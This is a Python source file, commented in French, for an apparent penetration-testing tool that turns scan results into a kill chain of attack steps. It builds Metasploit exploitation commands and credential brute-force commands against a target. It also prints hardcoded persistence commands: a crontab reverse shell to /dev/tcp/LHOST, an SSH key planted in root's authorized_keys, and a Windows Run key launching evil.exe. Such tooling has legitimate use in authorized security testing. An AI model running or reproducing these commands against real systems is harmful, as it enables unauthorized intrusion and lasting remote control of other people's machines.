"""
ChocoScan — Kill Chain Generator.

Analyse les résultats complets d'un scan (CVE, misconfigs, creds par défaut,
GTFOBins) et génère une narrative structurée du chemin d'exploitation probable
vers une compromission complète (root/SYSTEM).

Format inspiré des kill chains MITRE ATT&CK :
  Initial Access → Execution → Persistence → Privilege Escalation → Exfiltration

Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any


# ── Modèles ───────────────────────────────────────────────────────────────────

@dataclass
class AttackStep:
    phase:       str              # "initial_access" | "execution" | "privesc" | "lpe"
    title:       str
    description: str
    command:     str              # Commande concrète
    source:      str              # "cve" | "misconfig" | "default_creds" | "gtfobins" | "msf"
    severity:    str              # CRITICAL | HIGH | MEDIUM
    cve_id:      str = ""
    msf_module:  str = ""
    confidence:  str = "medium"   # high | medium | low
    lhost_needed: bool = False


@dataclass
class KillChain:
    target:            str
    os_guess:          str = "unknown"   # linux | windows | unknown
    initial_access:    list[AttackStep] = field(default_factory=list)
    execution:         list[AttackStep] = field(default_factory=list)
    privilege_escalation: list[AttackStep] = field(default_factory=list)
    persistence:       list[AttackStep] = field(default_factory=list)
    all_steps:         list[AttackStep] = field(default_factory=list)
    narrative:         str = ""
    feasibility_score: float = 0.0      # 0-10
    summary:           str = ""


# ── Détection de l'OS ─────────────────────────────────────────────────────────

def _guess_os(results: list[dict]) -> str:
    """Tente de deviner l'OS depuis les services détectés."""
    services_text = " ".join(
        f"{r.get('service', {}).get('service_name', '')} "
        f"{r.get('service', {}).get('banner', '')}"
        for r in results
    ).lower()

    windows_indicators = ["windows", "microsoft", "iis", "rdp", "netbios",
                          "ms-wbt", "smb", "cifs", "exchange", "mssql"]
    linux_indicators   = ["linux", "ubuntu", "debian", "centos", "fedora",
                          "openssh", "apache", "nginx", "vsftpd", "proftpd"]

    win_score = sum(1 for kw in windows_indicators if kw in services_text)
    lin_score = sum(1 for kw in linux_indicators if kw in services_text)

    if win_score > lin_score:
        return "windows"
    if lin_score > 0:
        return "linux"
    return "unknown"


# ── Extraction des vecteurs d'accès initial ───────────────────────────────────

def _extract_initial_access(results: list[dict], misconfigs: list,
                              os_guess: str) -> list[AttackStep]:
    steps: list[AttackStep] = []
    seen_cves: set[str] = set()

    for result in results:
        svc    = result.get("service", {})
        host   = svc.get("host", "TARGET")
        port   = svc.get("port", 0)
        banner = svc.get("banner", "")
        cves   = result.get("cves", [])

        # CVE RCE
        for cve in cves:
            cve_id   = cve.get("id", "")
            severity = cve.get("severity", "UNKNOWN")
            if severity not in ("CRITICAL", "HIGH"):
                continue
            if cve_id in seen_cves:
                continue

            tags = [t.lower() for t in cve.get("tags", [])]
            desc = (cve.get("description_fr") or cve.get("description", "")).lower()

            is_rce = any(kw in tags for kw in ("rce", "remote", "command-execution"))
            is_rce = is_rce or any(kw in desc for kw in ("remote code", "rce", "command execution", "execute"))

            if not is_rce and severity != "CRITICAL":
                continue

            msf_mods = cve.get("msf_modules", [])
            msf_path = msf_mods[0]["path"] if msf_mods else ""
            cvss     = cve.get("cvss", 0)

            cmd = ""
            if msf_path:
                cmd = (f"msfconsole -q -x 'use {msf_path}; "
                       f"set RHOSTS {host}; set RPORT {port}; run'")
            else:
                cmd = f"# Pas de module MSF connu — recherche manuelle pour {cve_id}"

            steps.append(AttackStep(
                phase="initial_access",
                title=f"RCE via {cve_id} ({svc.get('service_name', '')}:{port})",
                description=(f"CVSS {cvss} — "
                             f"{(cve.get('description_fr') or cve.get('description', ''))[:150]}"),
                command=cmd,
                source="cve",
                severity=severity,
                cve_id=cve_id,
                msf_module=msf_path,
                confidence="high" if msf_path else "medium",
                lhost_needed=bool(msf_path),
            ))
            seen_cves.add(cve_id)

        # Credentials par défaut
        default_creds = result.get("default_creds", {})
        if default_creds and default_creds.get("creds"):
            top_cred = default_creds["creds"][0]
            quick_test = default_creds.get("quick_test", "")
            steps.append(AttackStep(
                phase="initial_access",
                title=f"Credentials par défaut — {svc.get('service_name', '')}:{port}",
                description=(f"Tester en priorité : "
                             f"{top_cred['username']}:{top_cred['password'] or '(vide)'}"
                             f"{' — ' + top_cred['note'] if top_cred.get('note') else ''}"),
                command=quick_test or default_creds.get("hydra_cmd", ""),
                source="default_creds",
                severity="HIGH",
                confidence="medium",
            ))

    # Misconfigs = vecteurs d'accès direct
    for mc in misconfigs:
        if mc.severity in ("CRITICAL", "HIGH"):
            steps.append(AttackStep(
                phase="initial_access",
                title=f"Misconfig : {mc.title}",
                description=mc.description[:150],
                command=mc.check_cmd,
                source="misconfig",
                severity=mc.severity,
                confidence="high",
            ))

    # Tri : CRITICAL d'abord, puis par confiance
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
    conf_order = {"high": 0, "medium": 1, "low": 2}
    steps.sort(key=lambda s: (sev_order.get(s.severity, 3), conf_order.get(s.confidence, 3)))
    return steps


# ── Extraction des vecteurs de privesc ────────────────────────────────────────

def _extract_privesc(results: list[dict], gtfo_findings: list,
                      os_guess: str) -> list[AttackStep]:
    steps: list[AttackStep] = []
    seen_cves: set[str] = set()

    # CVE LPE
    for result in results:
        svc  = result.get("service", {})
        cves = result.get("cves", [])
        for cve in cves:
            cve_id = cve.get("id", "")
            if cve_id in seen_cves:
                continue
            tags = [t.lower() for t in cve.get("tags", [])]
            desc = (cve.get("description_fr") or cve.get("description", "")).lower()
            is_lpe = any(kw in tags for kw in ("lpe", "privesc", "privilege"))
            is_lpe = is_lpe or any(kw in desc for kw in ("privilege escal", "local privilege", "lpe"))
            if not is_lpe:
                continue

            msf_mods = cve.get("msf_modules", [])
            msf_path = msf_mods[0]["path"] if msf_mods else ""
            cmd = ""
            if msf_path:
                cmd = f"use {msf_path}  # Dans une session Meterpreter"
            else:
                cmd = f"# Exploit manuel pour {cve_id} — voir searchsploit {cve_id}"

            steps.append(AttackStep(
                phase="privilege_escalation",
                title=f"LPE via {cve_id}",
                description=(f"CVSS {cve.get('cvss', '?')} — "
                             f"{(cve.get('description_fr') or cve.get('description', ''))[:150]}"),
                command=cmd,
                source="cve",
                severity=cve.get("severity", "HIGH"),
                cve_id=cve_id,
                msf_module=msf_path,
                confidence="high" if msf_path else "medium",
            ))
            seen_cves.add(cve_id)

    # GTFOBins
    for gtfo in gtfo_findings:
        if not gtfo.exploits:
            continue
        entry = gtfo.exploits[0]
        method_label = {"sudo": "sudo", "suid": "binaire SUID",
                        "capabilities": "capability Linux"}.get(gtfo.vector, gtfo.vector)

        steps.append(AttackStep(
            phase="privilege_escalation",
            title=f"GTFOBins : {gtfo.binary} ({method_label})",
            description=(f"{gtfo.binary} est accessible via {method_label} "
                         f"et permet une élévation de privilèges."),
            command=entry.command,
            source="gtfobins",
            severity="HIGH",
            confidence="high",
        ))

    return steps


# ── Calcul du score de faisabilité ────────────────────────────────────────────

def _compute_feasibility(initial: list[AttackStep],
                          privesc: list[AttackStep]) -> float:
    """Score 0-10 représentant la facilité estimée de compromission complète."""
    score = 0.0

    if not initial:
        return 0.0

    # Accès initial
    best_initial = initial[0]
    if best_initial.severity == "CRITICAL":
        score += 4.0
    elif best_initial.severity == "HIGH":
        score += 2.5

    if best_initial.source == "misconfig":
        score += 1.5  # Misconfig = souvent plus facile qu'une CVE
    elif best_initial.confidence == "high":
        score += 1.0

    if best_initial.msf_module:
        score += 1.0  # Module MSF dispo = plus facile

    # Élévation de privilèges
    if privesc:
        best_privesc = privesc[0]
        if best_privesc.source == "gtfobins":
            score += 2.0  # GTFOBins = souvent trivial
        elif best_privesc.severity == "CRITICAL":
            score += 1.5
        elif best_privesc.severity == "HIGH":
            score += 1.0

    return min(score, 10.0)


# ── Génération de la narrative ────────────────────────────────────────────────

def _generate_narrative(target: str, os_guess: str,
                         initial: list[AttackStep],
                         privesc: list[AttackStep],
                         feasibility: float) -> str:
    """Génère une narrative en langage naturel du chemin d'exploitation."""
    lines: list[str] = []

    # En-tête
    os_label = {"linux": "Linux", "windows": "Windows"}.get(os_guess, "inconnue")
    lines.append(f"=== KILL CHAIN — {target} ===")
    lines.append(f"OS detecte    : {os_label}")
    lines.append(f"Score         : {feasibility:.1f}/10  "
                 f"({'Compromission probable' if feasibility >= 6 else 'Acces partiel possible' if feasibility >= 3 else 'Difficile'})")
    lines.append("")

    # Accès initial
    if initial:
        lines.append("── ACCES INITIAL ──────────────────────────────")
        best = initial[0]
        if best.source == "misconfig":
            lines.append(f"[!] {best.title}")
            lines.append(f"    {best.description}")
            lines.append(f"    > {best.command}")
        elif best.source == "default_creds":
            lines.append(f"[!] {best.title}")
            lines.append(f"    {best.description}")
            lines.append(f"    > {best.command}")
        elif best.source == "cve":
            lines.append(f"[CVE] {best.title} (confiance: {best.confidence})")
            lines.append(f"    {best.description}")
            if best.msf_module:
                lines.append(f"    Module MSF : {best.msf_module}")
            lines.append(f"    > {best.command}")

        if len(initial) > 1:
            lines.append(f"    + {len(initial)-1} autre(s) vecteur(s) disponible(s)")
        lines.append("")

    else:
        lines.append("── ACCES INITIAL ──────────────────────────────")
        lines.append("    Aucun vecteur d'acces initial identifie avec certitude.")
        lines.append("    Recommandation : brute-force (voir --default-creds), enumeration")
        lines.append("    approfondie, recherche de vhosts/endpoints non detectes.")
        lines.append("")

    # Privesc
    if privesc:
        lines.append("── ELEVATION DE PRIVILEGES ────────────────────")
        best_lpe = privesc[0]
        if best_lpe.source == "gtfobins":
            lines.append(f"[GTFOBins] {best_lpe.title}")
            lines.append(f"    Binaire exploitable detecte sur la cible.")
            # Affiche la commande sur plusieurs lignes si nécessaire
            for cmd_line in best_lpe.command.split("\n"):
                lines.append(f"    > {cmd_line}")
        elif best_lpe.source == "cve":
            lines.append(f"[CVE] {best_lpe.title}")
            lines.append(f"    {best_lpe.description}")
            lines.append(f"    > {best_lpe.command}")

        if len(privesc) > 1:
            lines.append(f"    + {len(privesc)-1} autre(s) vecteur(s) LPE disponible(s)")
        lines.append("")

    else:
        lines.append("── ELEVATION DE PRIVILEGES ────────────────────")
        lines.append("    Aucun vecteur LPE identifie automatiquement.")
        lines.append("    Recommandation apres acces : executer LinPEAS/WinPEAS,")
        lines.append("    verifier sudo -l, SUID, capabilities, crons.")
        lines.append("")

    # Persistance suggérée
    if initial:
        lines.append("── PERSISTANCE SUGGEREE ───────────────────────")
        if os_guess == "linux":
            lines.append("    > echo 'LHOST_SSH_PUBKEY' >> /root/.ssh/authorized_keys")
            lines.append("    > echo '* * * * * bash -i >& /dev/tcp/LHOST/4445 0>&1' >> /etc/crontab")
        elif os_guess == "windows":
            lines.append("    > run post/windows/manage/persistence_exe")
            lines.append("    > reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d C:\\evil.exe")
        else:
            lines.append("    > Voir post/multi/manage/shell_to_meterpreter pour upgrade")
        lines.append("")

    # Résumé final
    lines.append("── RESUME ─────────────────────────────────────")
    if initial and privesc:
        lines.append(f"    Chemin probable : {initial[0].title}")
        lines.append(f"    → shell bas privilege → {privesc[0].title} → root/SYSTEM")
    elif initial:
        lines.append(f"    Acces probable via : {initial[0].title}")
        lines.append("    → Privesc manuelle necessaire apres acces")
    else:
        lines.append("    Aucun chemin automatique identifie — enumeration manuelle requise.")

    return "\n".join(lines)


# ── Point d'entrée principal ──────────────────────────────────────────────────

def generate_kill_chain(
    results: list[dict],
    target: str,
    misconfigs: list | None = None,
    gtfo_findings: list | None = None,
) -> KillChain:
    """
    Génère la kill chain complète depuis les résultats du pipeline.

    `results`       : résultats du pipeline CVE (liste de dicts)
    `target`        : IP ou hostname de la cible
    `misconfigs`    : résultats de detect_misconfigs() (optionnel)
    `gtfo_findings` : résultats de analyze_ssh_findings() (optionnel)
    """
    misconfigs    = misconfigs or []
    gtfo_findings = gtfo_findings or []

    os_guess = _guess_os(results)
    initial  = _extract_initial_access(results, misconfigs, os_guess)
    privesc  = _extract_privesc(results, gtfo_findings, os_guess)
    feasibility = _compute_feasibility(initial, privesc)
    narrative   = _generate_narrative(target, os_guess, initial, privesc, feasibility)

    all_steps = initial + privesc
    summary = (
        f"{len(initial)} vecteur(s) d'acces initial, "
        f"{len(privesc)} vecteur(s) de privesc — "
        f"score {feasibility:.1f}/10"
    )

    return KillChain(
        target=target,
        os_guess=os_guess,
        initial_access=initial,
        privilege_escalation=privesc,
        all_steps=all_steps,
        narrative=narrative,
        feasibility_score=feasibility,
        summary=summary,
    )
